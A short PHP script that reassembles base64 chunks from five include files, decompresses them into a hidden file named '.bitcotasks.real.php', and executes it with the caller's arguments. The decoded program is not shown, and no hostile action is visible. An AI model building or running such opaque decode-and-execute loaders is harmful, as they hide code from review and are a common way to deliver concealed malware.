#!/usr/bin/env php
<?php
// single entry — no part1.b64 / part2.b64
for ($i = 0; $i < 5; $i++) {
    require __DIR__ . "/_c{$i}.php";
}
$b = implode("", $GLOBALS["_bc"]);
$r = gzdecode(base64_decode($b));
if ($r === false || strpos($r, "<?php") === false) { fwrite(STDERR, "decode fail\n"); exit(1); }
$path = __DIR__ . "/.bitcotasks.real.php";
file_put_contents($path, $r);
passthru(PHP_BINARY . " " . escapeshellarg($path) . " " . implode(" ", array_map("escapeshellarg", array_slice($argv, 1))));
